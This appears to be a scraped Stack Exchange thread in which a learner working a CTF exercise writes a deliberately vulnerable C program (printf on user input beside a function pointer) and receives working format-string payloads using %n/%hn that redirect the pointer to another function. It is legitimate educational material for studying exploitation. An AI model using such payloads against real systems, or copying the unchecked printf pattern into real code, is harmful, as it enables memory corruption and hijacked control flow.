@@ -1,0 +1,62 @@
+{
+  "title": "Newbie problems exploiting a format string vulnerability",
+  "link": "https://reverseengineering.stackexchange.com/questions/25257/newbie-problems-exploiting-a-format-string-vulnerability",
+  "content": "I encountered a print format vulnerability challenge in a CTF. I don't know anything about these vulnerabilities, so I'm working my way through Saif El-Sherei's format string exploitation tutorial from exploit-db.com (https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf). But, I'm getting stuck really early on. I'm hoping someone can point out where I'm going wrong.\n\nHere's some code I wrote:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid nicefunction()\n{\n        printf(\"you are in the nice function!  \n\");\n}\nvoid notnicefunction()\n{\n        printf(\"you are in the NOT nice function!  \n\");\n}\nint foo()\n{\n  void (*fptr)() = &nicefunction;\n  char buf[100];\n\n  puts(\"Please enter a string. \");\n  fgets(buf,80,stdin);\n  puts(\"Here's your string\");\n  printf(buf);\n  puts(\"  \nNow we call the nice function\");\n  (*fptr)();\n  return 0;\n}\n\nint main(int argc, char **argv)\n{\n  foo();\n}\n\n```\nMy goal is to craft an input string that I can use to change fptr to point to notnicefunction. I compiled it with: gcc -m32 -g test.c -fno-stack-protector -z execstack -o test\n\nI ran the binary under gdb and added before and after breakpoints. When I enter the string \"AAAA\" and then do x/20xw $esp afterwards, I see my 0x41414141 in the stack, at 0xffffd018. If I rerun and enter the string \"AAAA %6$x\" I get AAAA 41414141. So far so good.\n\nNow I want to find the address of fptr. Using nm, I see that it should contain the value of 0x0804849b (the address of nicefunction). My goal is to change it to 0x080484b4, the address of notnicefunction. I rerun with AAAA, and then examine the stack until I find the address that contains 0x0804849b. That's 0xffffd07c, 0x64 (100d) words deeper in the stack from the start of buf. Which makes sense.\n\nI'd like to control the contents of fptr by using %n. So I crafted this input string: \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n. I think this should change the contents of 0xffffd07c to 13d. But instead I segfault in the printf.\n\nWhere am I going wrong?\n\nUPDATE: I tried writing my fptr address into the start of the buffer, just to see if I was writing the address correctly. But when I checked it in gdb, it had the ASCII representation in it: \n\n```\n(gdb) x/20xw $esp+8\n0xffffd018: 0x6337785c  0x3064785c  0x6666785c  0x6666785c\n\n```\nSo the problem is that bash doesn't like my hex literals. I guess I could fix this with redirection from a file. But if anyone knows of a cleaner way to handle this, I'd love to know about it.\n\nMOAR UPDATE: Pawel's comment below got me past the how-do-I-get-hex-bytes-into-this-binary hurdle. But I was still segfaulting on my %n. But the segfaults went away when I changed %5$x %n to %x %x %x %x %x %n. Now I am able to (sort of) control the contents of arbitrary stack memory. Whoohoo!\n\n",
+  "votes": "2",
+  "answers": 2,
+  "views": "287",
+  "tags": [
+    "linux",
+    "c",
+    "exploit"
+  ],
+  "user": "Polly",
+  "time": "Jun 10, 2020 at 22:02",
+  "comments": [
+    {
+      "user": "Paweł Łukasik",
+      "text": "how are you passing your data to this binary? Try something like echo -e \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n | ./test",
+      "time": null
+    },
+    {
+      "user": "Polly",
+      "text": "Pawel's comment pointed me on the way, with one tweak because I'm running under gdb: echo -n -e '\\x7c\\xd0\\xff\\xff. %x %x %x %x %x %n' > /tmp/xxx and then r < /tmp/xxx at the gdb prompt.",
+      "time": null
+    },
+    {
+      "user": "multithr3at3d",
+      "text": "If you want a realistic challenge, compile with the default flags.",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "The input string that finally let me execute the not nice function was echo -n -e '\\x7c\\xd0\\xff\\xffJUNK\\x7e\\xd0\\xff\\xff. %x %x %x %x %33929x %hn' > /tmp/xxx\n\nThis gave me:\n\n```\n22    (*fptr)();\n(gdb) x/4xw 0xffffd070\n0xffffd070: 0x00000001  0x00000003  0xf7e25a50  0x080484b4\n(gdb) c\nContinuing.\nyou are in the NOT nice function!\n\n```\n",
+      "votes": "1",
+      "user": "Polly",
+      "time": "Jun 10, 2020 at 22:01",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "multithr3at3d",
+          "text": "I don't think you need the address twice since you are only using one %n",
+          "time": null
+        }
+      ]
+    },
+    {
+      "content": "I am not sure the %n takes the next argument after the %5$x.\n\nTry \\x7c\\xd0\\xff\\xffAAAA%6$n. Seemed to work for me.\n\n",
+      "votes": "0",
+      "user": "Artelius",
+      "time": "Jun 9, 2020 at 23:51",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "Polly",
+          "text": "Thanks for the suggestion ... but I tried it and no joy.",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
